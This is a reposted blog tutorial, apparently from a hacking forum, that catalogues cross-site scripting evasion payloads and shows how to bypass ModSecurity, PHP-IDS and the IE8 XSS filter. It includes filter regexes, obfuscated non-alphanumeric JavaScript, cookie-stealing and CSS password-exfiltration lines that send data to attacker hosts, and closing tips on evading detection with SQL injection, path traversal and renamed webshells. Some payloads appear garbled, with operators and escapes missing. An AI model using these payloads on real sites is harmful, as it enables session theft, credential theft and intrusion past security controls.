---
author: ww
comments: true
date: 2015-12-06 01:19:55+00:00
layout: post
link: http://www.gl6.cc/blog/xss-xss-evasion-techniques.html
slug: xss-xss-evasion-techniques
title: '[XSS] XSS Evasion Techniques'
wordpress_id: 345
categories:
- safe
- uncategorized
tags:
- xss
---

## XSS Evasion Techniques by lem0n 



 

    
    <img/src="mars.png"alt="mars"> 
        * No white space, can use / or nothing at all after quoted attributes
    
    --[HTML Tricks
    
    <object><param name="src" value= "javascript:alert(0)"></param></object> 
        * Round about way to assign the src paramater
    
    <object data="javascript:alert(0)"> 
        * Avoids "src" altogether
    
    <isindex type=image src=1 onerror=alert(1)> 
    
    <isindex action=javascript:alert(1) type=image> 
        * Few know of isindex tag
    
    <img src=x:alert(alt) onerror=eval(src) alt=0> 
        * src = this.src, alt = this.alt
    
    <x:script xmlns:x="http://www.w3.org/1999/xhtml">alert('xss');</x:script> 
        * Content served as text/xml and text/xml-xhtml can execute JavaScript by using html and xhtml namespaces
    
    --[XHTML Tricks
    
    location='javascript:alert(0)'; 
    location=name;  
        * Short, no parenthesis for second
        * Victim is not actually redirected anywhere so it can be transparent
        * name = window.name
        * Downside: attacker controlled website must be involved
        * Downside: persistent XSS is demoted to reflective XSS
     
    --[JavaScript Tricks
    
    location=location.hash.slice(1); //avoid the # 
    location=location.hash //FF only 
        * Payload comes after hash in URL
        * Victim website does not see true payload
        * No parenthesis in second one
        * In FireFox, you can incorporate the hash symbol as a sharp variable, #0={}
    
    http://fu.bar/?param=";location=location.hash)//#0={};alert(0) 
    
    alert(document.cookie)
    
    alert(document['cookie'])
    
    with(document)alert(cookie) 
        * These are all equivalent
    
    eval(document.referrer.slice(10)); 
        * When attacker controls referrer page
    
    eval(0 location.string) //or 1 location.string 
        * Use a ternary operator along with fake GET paramaters, e.g.
    
    0?fake1=1/*&id=42&name=";eval(1 location.string);"&lang=EN&fake2=*/:alert(0) 
     
    x setter=eval,x=1 
        * Execute arbitrary code without quotes or parenthesis
        * FF only
        * This notation has been deprecated for years...
    
    http://fu.bar/?p=";eval(unescape(location))//# 
    alert(0) 
        * http: JavaScript label
        * //  single line comment
        * 
     newline, needs to be unescaped
    
    "" {toString:alert}  
    
    "" {valueOf:alert} 
        * Executes function without using () or =
        * Works in IE and Opera
     
    (É=[Å=[],ĩ=!Å Å][ĩ[Č=-~-~  Å] ({} Å) [Į=!!Å ĩ,Š=Į[Å] Į[ !Å],Å] Š])() [ĩ[Å] ĩ[Å Å] Į[Č] Š](Å) 
    ($=[$=[]][(__=!$ $)[_=-~-~-~$] ({} $)[_/_] ($$=($_=!''
     $)[_/_] $_[ $])])()[__[_/_] __[_ ~$] $_[_] $$](_/_) 
        * what, you don't see the alert(1) in there?
        * no alphanumeric characters, can execute arbitrary JavaScript
    
    <b/alt="1"onmouseover=InputBox 1 language=vbs>test</b> 
        * IE only
        * vbscript in event handlers
    
    --[VBScript Tricks
    
    eval name 
        * just like eval(name) in JavaScript
    
    </a onmousemove="alert(1)"> 
        * HTML5 will allow attributes in closing tags
    
    --[Future Tricks?
    
    <style>input[name=password][value*=a]{
    
    background:url('//attacker?log[]=a');
    
    }</style>
    
    <iframe seamless src=”login.asp”/> 
        * HTML5 includes "seamless" iframes
        * could allow for pure css-based XSS attacks
    
    data:text/html,<script>alert(0)</script> 
    
    data:text/html;base64, PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg== 
        * supported by all modern browsers except IE (congrats to IE team J)
    
     
    --[Other Tricks
    
    ?injection=<script &injection=>alert(1)></script> 
        * HPP - HTTP Paramater Pollution
        * Variations of this can bypass most filters (not IE8)
        * Underlying server/application must join parameters somehow (ASP, ASP.NET on IIS)
        
    <script>var m=<html><a href=”//site”>link</a>
    
    </html></script> // XML inside JS 
        * XML inside JavaScript
    
    <html><title>{alert('xss')}</title></html> 
        * JavaScript inside XML evaluated as JavaScript
    
    
    --[Unicode and XSS 
    
    Overlong UTF 
        * Ways to represent the “less than” char <
        * 0x3C
        * 0xC0 0xBC
        * 0xE0 0x80 0xBC
        * 0xF0 0x80 0x80 0xBC
        * Unicode Forbids this!
        * Example exploit:
        * À¼scriptÀ¾alert(1)À¼/scriptÀ¾
    
    --[PHP 
    
    unsigned short c;// 16 bits
    ... 
    if (c >= 0xf0) { /* four bytes encoded, 21 bits */ 
            c = ((s[0]&7)<<18) | ((s[1]&63)<<12) | ((s[2]&63)<<6) | (s[3]&63); 
            s  = 4; 
            pos -= 4; 
    
        * “c” is overflowed
        * Eg: ÿð€¼ 
        * 1111 1111 1111 0000 1000 0000 1010 1100
    
    --[Eating chars 
    
        * <img src="x:ö" title="onerror=alert(1)//">
    ö == x90 (also works with other chars, but we want to use NOP) 
        * PHP’s utf8_decode will transform it to:
    
    <img src="x:? title=" onerror=alert(1)//"> 
    
        * Tip: this also works on all M$ products (IE).. 
          Still thinking your filter is safe?
    
    --[The Filters 
    
    -[ModSecurity 
    http://modsecurity.org/
        * Open Source
        * easy to install Apache module
     
    ModSecurity Advantages
        * filters are ineffective
        * Infrequently updated
        * No support for different encodings
     
    ModSecurity Disadvantages
    Most of the XSS filtering occurs in just one filter 
        * First phase – must match one of these keywords:
    @pm jscript onsubmit copyparentfolder javascript meta onmove onkeydown
    onchange onkeyup activexobject expression onmouseup ecmascript onmouseover vbsc
    ript: <![cdata[ http: settimeout onabort shell: .innerhtml onmousedown onkeypres
    s asfunction: onclick .fromcharcode background-image: .cookie ondragdrop onblur
    x-javascript mocha: onfocus javascript: getparentfolder lowsrc onresize @import
    alert onselect script onmouseout onmousemove background application .execscript
    livescript: getspecialfolder vbscript iframe .addimport onunload createtextrange
    onload <input 
    
    ModSecurity Filters
        * Second phase – must match this regular expression:
    
    (?:b(?:(?:typebW*?b(?:textbW*?b
    (?:j(?:ava)?|ecma|vb)|applicationbW*?bx-(?:java|vb))script|c(?:opyparentfolde
    r|reatetextrange)|get(?:special|parent)folder|iframeb.{0,100}?bsrc)b|on(?:(?:
    mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)|key(?:press|down|up)|c(?:hange|lick)|s(
    ?:elec|ubmi)t|(?:un)?load|dragdrop|resize|focus|blur)bW*?=|abortb)|(?:l(?:ows
    rcbW*?b(?:(?:java|vb)script|shell|http)|ivescript)|(?:href|url)bW*?b(?:(?:
    java|vb)script|shell)|background-image|mocha):|s(?:(?:tylebW*=.*bexpressionb
    W*|ettimeoutbW*?)(|rcbW*?b(?:(?:java|vb)script|shell|http):)|a(?:ctivexob
    jectb|lertbW*?(|sfunction:))|<(?:(?:bodyb.*?b(?:backgroun|onloa)d|inputb.
    *?btypebW*?bimage)b| ?(?:(?:script|meta)b|iframe)|![cdata[)|(?:.(?:(?:e
    xecscrip|addimpor)t|(?:fromcharcod|cooki)e|innerhtml)|@import)b) 
     
    ModSecurity Filters
    The filter will catch: 
    <img src="x:gif" onerror="alert(0)"> 
    but miss: 
    <img src="x:alert" onerror="eval(src '(0)')">
    and
    <img src="x:gif" onerror="eval('al' 'lert(0)')">
    and
    <img src="x:gif" onerror="window['alu0065rt'](0)"></img> 
     
    The filter will catch: 
    ";document.write('<img src=http://p42.us/x.png?' document.cookie '>');" 
    but miss: 
    ";document.write('<img sr' 'c=http://p42.us/x.png?' document['cookie'] '>');" 
     
    ModSecurity
        * Good for novices to practice against
        * Other types of filters (SQLi, Response Splitting, etc) are just as bad
    
     
    -[PHP-IDS 
    http://php-ids.org/
        * Attempts to detect all attacks (not just common attacks).
        * Easily catches all basic injections
        * Open source - a lot of people "hack it" in their "free time"
        * Well maintained - rule-sets are frequently attacked and improved
        * Codebase supports a lot of encoding algorithms
    
    PHP-IDS Advantages
        * Sometimes false positives
        * PHP-dependant ("ported" to typo3, Drupal, perl)
        * CPU consumption
    
    PHP-IDS Disadvantages
        * Aggressive blacklist filtering
              o detects all forms of XSS imaginable (and more)
        * Each injection is given a score based upon the number of filters triggered
        * Filters have greatly improved over past 2 years thanks to demo.phpids.org, sla.ckers, and Mario who frequently updates
    
    PHP-IDS
    
    (?:,s*(?:alert|showmodaldialog|eval)s*,)|(?::s*evals*[^s])|([^:sw,./? -]s*)?(?<![a-z/_@])(s*returns*)?(?:(?:documents*.)?(?:. /)?(?:alert|eval|msgbox|showmodaldialog|prompt|write(?:ln)?|confirm|dialog|open))s*(?(1)[^w]|(?:s*[^sw,.@/ -]))|(?:java[s/]*.[s/]*lang)|(?:ws*=s*news w )|(?:&s*w s*)[^,])|(?: [Wd]*news w [Wd]* )|(?:document.w) 
     
    Filter Examples 
        * Filters are very targeted
        * Has 68 filters in addition to the one below (majority are for XSS, not all)
    https://svn.phpids.org/svn/trunk/lib/IDS/default_filter.xml
    
    PHP-IDS Developing a Bypass 
    
    eval(name) 
    Injection Found! Overall Impact: 17 
     
    x=eval
    
    y=name
    
    x(y) 
    
    Injection Found! Overall Impact: 12 
     
    x='ev' 'al'
    
    x=this[x]
    
    y='na' 'me'
    
    x(x(y)) 
    
    Injection Found! Overall Impact: 46 
     
    $$='e'
    
    x='ev' 'al'
    
    x=this[x]
    
    y='nam' $$
    
    y=x(y)
    
    x(y) 
    
    Injection Found! Overall Impact: 37 
     
    $$='e'
    
    x=$$ 'val'
    
    z=(1)['__par' 'ent__']
    
    x=z[x]
    
    y=x('nam' e)
    
    x(y) 
    
    Injection Found! Overall Impact: 62 
    
    $$='e'
    
    __='__par'
    
    x=$$ 'val'
    
    z=(1)[__ 'ent__']
    
    x=z[x]
    
    y=x('nam' e)
    
    x(y) 
    
    Injection Found! Overall Impact: 27 
    
    $$='e'
    
    __='__par'
    
    x=$$ 'val'
    
    x=1 []
    
    z=$$ 'nt__'
    
    x=x[__ z]
    
    x=z[x]
    
    y=x('nam' e)
    
    x(y) 
    
    Injection Found! Overall Impact: 18
    
    __=''
    
    $$=__ 'e'
    
    __=__ '__par'
    
    x=$$ 'val'
    
    x=1 []
    
    z=$$ 'nt__'
    
    x=x[__ z]
    
    x=z[x]
    
    y=x('nam' e)
    
    x(y) 
    
    Injection Found! Overall Impact: 14
    
    __=''
    
    $$=__ 'e'
    
    __=__ '__par'
    
    _=$$ 'val'
    
    x=1 []
    
    z=$$ 'nt__'
    
    x=x[__ z]
    
    x=x[_]
    
    y=x('nam' $$)
    
    x(y) 
    
    Injection Found! Overall Impact: 07
    
    __=''
    
    $$=__ 'e'
    
    __=__ '__par'
    
    _=$$ 'val'
    
    x=1 []
    
    z=$$ 'nt__'
    
    x=x[__ z]
    
    x=x[_]
    
    y=x('nam' $$)
    
    x(y)
    
    'abc(def)ghi(jkl)mno(pqr)abc(def)ghi ' 
    
    Injection Found! Overall Impact: 07
    
    __=''
    
    $$=__ 'e'
    
    __=__ '__par'
    
    _=$$ 'val'
    
    x=1 []
    
    z=$$ 'nt__'
    
    x=x[__ z]
    
    x=x[_]
    
    y=x('nam' $$)
    
    x(y) 'abc(def)ghi(jkl)mno(pqr)abc(def)abc(def)...' 
    
    Nothing suspicious was found!
    
    Other Recent bypasses: 
    
    <b/alt="1"onmouseover=InputBox 1 language=vbs>test</b> 
      
    this[[] ('eva') (/x/,new Array) 'l'](/xxx.xxx.xxx.xxx.xx/ name,new Array) 
    
    
    -setTimeout(  
    1E1   
    ',aler  
    t ( /phpids rocks/ )   1E100000 ' ) 
     
    <b "<script>alert(1)</script>">hola</b> 
    
    
    --XSS Filter 
    
    http://blogs.technet.com/srd/archive/2008/08/19/ie-8-xss-filter-architecture-implementation.aspx
    http://blogs.msdn.com/dross/archive/2008/07/03/ie8-xss-filter-design-philosophy-in-depth.aspx 
    
    Compatibility > Security > Performance
    HTTP/1.0 200 OK 
    Cache-Control: private, max-age=0 
    Date: Sun, 11 Jul 2010 01:23:45 GMT 
    Content-Type: text/html; charset=ISO 
    Set-Cookie: ASDF=123 
    Server: Apache 
    X-XSS-Protection: 0  
              o If its not compatible, admins will turn it off!
    
    Performance   Compatibility
    
        * The filter will protect against the Top 3 Reflected XSS vectors:  
        *  
          <div>$injection</div>  
        *  
          <input value=“$injection”> 
        *  
          <script> 
           var a = “$injection”;  
          </script>
    
    
    FIND THE RULES:
    
    C:>findstr /C:"sc{r}" WINDOWSSYSTEM32mshtml.dll|find "{" 
     
    {<st{y}le.*?>.*?((@[i\])|(([:=]|(&[#()=]x?0*((58)|(3A)|(61)|(3D));?)).*?([(\]|(&[#()=]x?0*((40)|(28)|(92)|(5C));?))))}
    {[ / t"'`]st{y}le[ / t]*?=.*?([:=]|(&[#()=]x?0*((58)|(3A)|(61)|(3D));?)).*?([(\]|(&[#()=]x?0*((40)|(28)|(92)|(5C));?))}
    {<OB{J}ECT[ / t].*?((type)|(codetype)|(classid)|(code)|(data))[ / t]*=}
    {<AP{P}LET[ / t].*?code[ / t]*=}
    {[ / t"'`]data{s}rc[  t]*?=.}
    {<BA{S}E[ / t].*?href[ / t]*=}
    {<LI{N}K[ / t].*?href[ / t]*=}
    {<ME{T}A[ / t].*?http-equiv[ / t]*=}
    {<?im{p}ort[ / t].*?implementation[ / t]*=}
    {<EM{B}ED[ / t].*?SRC.*?=}
    {[ / t"'`]{o}nccc ?[  t]*?=.}
    {<.*[:]vmlf{r}ame.*?[ / t]*?src[ / t]*=}
    {<?f{r}ame.*?[ / t]*?src[ / t]*=}
    {<is{i}ndex[ / t>]}
    {<fo{r}m.*?>}
    {<sc{r}ipt.*?[ / t]*?src[ / t]*=}
    {<sc{r}ipt.*?>}
    {["'][ ]*(([^a-z0-9~_:'" ])|(in)).*?(((l|(\u006C))(o|(\u006F))(c|(\u0063))(a|(\u0061))(t|(\u0074))(i|(\u0069))(o|(\u006F))(n|(\u006E)))|((n|(\u006E))(a|(\u0061))(m|(\u006D))(e|(\u0065)))).*?{=}}
    {["'][ ]*(([^a-z0-9~_:'" ])|(in)). ?(([.]. ?)|([[].*?[]].*?)){=}}
    {["'].*?{)}[ ]*(([^a-z0-9~_:'" ])|(in)). ?{(}}
    {["'][ ]*(([^a-z0-9~_:'" ])|(in)). ?{(}.*?{)}}
    
        * Request
              o ?var=<script> 
        * Rule matched:
              o {<sc{r}ipt.*?>} 
        * Response Source Code
              o <script> 
        * Final Source Code
              o <sc#ipt>
    
    --[Top 10 reflected XSS attacks and how you can attack with them. 
     
    -[Bypassing the Filter
    
        * Fragmented ?url=' x=`&name=` onmouseover='alert(1)
    
    <a href='<?php echo htmlentities($url);?>'/>
    
     <?php echo htmlentities($name);?>
    
    </a>
    
        * DOM based /index.php/<script x>alert(1)</script>/
    
    document.write("<a href='/suggestToFriend/?p=" location.href "'>");
     
        * Inside event attributes ?id=alert(1)
    
    <a href="#" onclick="deleteTopic($id)"> 
    
    --[Unfiltered Vectors 
    
    -[Reflected XSS means that the matched attack has to be present in the HTML source code. 
     
        * Strings that were modified in the backend
        * <script>product=‘<?=strtolower($prod)?>’;</script>
        * Attacks abusing charset peculiarities
        * Attacks that are not reflected in the same page
          https://www.dev.java.net/servlets/Search?mode=1&resultsPerPage="'/><script>alert('Props To TheRat')</script>&query=3&scope=domain&artifact=2&Button=Search 
        * Attacks that are made to content not loaded as HTML
    
    <img src=“http://victim/newUser?name=<script>alert(1)</script>”/> 
    
    <iframe src=“http://victim/newUser”></iframe> 
     
    -[Using CSS-only attacks 
    
    <style>
    
    input[type=password][value^=a]{
    
              o background:"//attacker.com/log.php?hash[]=a";
    
    }
    
    input[type=password][value^=b]{
    
              o background:"//attacker.com/log.php?hash[]=b";
    
    }…
    
    </style> 
    
    <input type=password value=“tzu”> 
     
    --[Several XSS attacks are possible with just CSS and HTML, check: “The Sexy Assassin” http://p42.us/css 
    
    <img src='http://attacker.com/log.php?HTML=
    
    <form>
    
    <input type=“hidden” name=“nonce” value=“182b1cdf1e1038a”>
    
    <script>
    
    x=‘asdf’;
    
    THE ATTACKER RECEIVES ALL THE HTML CODE UNTILL THE QUOTE 
    
    Unclosed Quote
    
    <img src='http://attacker.com/log.php?HTML=
    
    <form>
    
    <input type=“hidden” name=“nonce” value=“182b1cdf1e1038a”>
    
    <script>
    
    x=‘asdf’;
    
    THE ATTACKER RECEIVES ALL THE HTML CODE UNTILL THE QUOTE 
    
    Unclosed Quote
        * Intranet
        * Same Origin
    
    Other Exceptions
        * Allowed by the filter:
              o <a href=“anything”>clickme</a>
        * So this wont be detected (clickjacking):
              o <a href=“?xss=<script>”>link</a>
          http://search.cnn.com/search?query=aaa&currentPage=2&nt="><a href="?query=aaa&currentPage=2&nt="><script>alert('Props To The Rat')</script>"><img style="cursor:arrow;height:200%;width:200%;position:absolute;top:-10px;left:-10px;background-image:transparent" border=0/></a>
    
    Same Origin Exception   Clickjacking
        * CRLF Injection:
    
    header(“Location: ”.$_GET[‘redir’]); 
    
    redir=“nX-XSS-Protection: 0nn<script…” 
    
    -[Disabling the filter
        * IE8 Blocks JS by disabling:
              o =
              o (
              o )
    
        * BUT It is possible to execute code without () and =
        * {valueOf:location,toString:[].join,0:name,length:1}
        * We are limited to attacks inside JS strings like:
        * urchinTracker("/<?=$storeId;?>/newOrder");
        * loginPage=“<?=$pages[‘login’]?>”;
        * Some JSON parsers passing a “sanitized” string to eval() may also be vulnerable to this same bypass.
    
    -[Bypassing the JavaScript based Filter
        * Other possible bypasses?
              o Require a certain context.
              o new voteForObama; // executes any user-function without ( )
              o “:(location=name) // is not detected (ternary operator // object literal)
              o “?name:”// is not detected, modify string value, relevant on cases like:
                      location=“/redir?story=<?=$story?>”;
                      “&&name
              o “;(unescape=eval); // redeclare functions J
            
    Original code:
        * <script>if(top!=self)top.location=location</script>
    Request:
    
        * ?foobar=<script>if
     
    After filter:
    
        * <sc#ipt>if(top!=self)top.location=location</script>
     
    --[Attacking content-aware filters 
    Original code:
        * <script> 
           continueURI=“/login2.jsp?friend=<img src=x onerror=alert(1)>”; 
          </script>
    Request:
        * ?foobar=<script>continueURI
    After filter:
        * <sc#ipt> 
           continueURI=“/login2.jsp?friend=<img src=x onerror=alert(1)>”; 
          </script>
    
    --[More Evasions
    
    -[For blind SQL injections. 
    Stop using ' or 1=1--. 
    Use ' or 2=2--. 
    
    -[For SQL injections. 
    Stop using UNION SELECT. 
    Use UNION ALL SELECT. 
    
    -[Misc.
    Don’t do /etc/passwd. 
    Do /foo/../etc/bar/../passwd. 
    
    Don’t use http://yourhost.com/r57.txt  
    https://yourhost.com/lol.txt 
    
    Don’t call your webshell c99.php, shell.aspx or cmd.jsp 
    Call it rofl.php. 
    
    Rules
              o For Internet Explorer, use IE-8, and enable the XSS Filter
              o If you can use Firefox, use Firefox NoScript
              o If you need an IDS for web-threats {xss/sqli/etc}:
                      don't use mod_security until filters are better
                      use PHP-IDS
              o For sanitizing HTML, use HTMLPurifier/Antisamy, or use templating systems!



原地址 https://evilzone.org/tutorials/xss-evasion-techniques-by-lem0n/
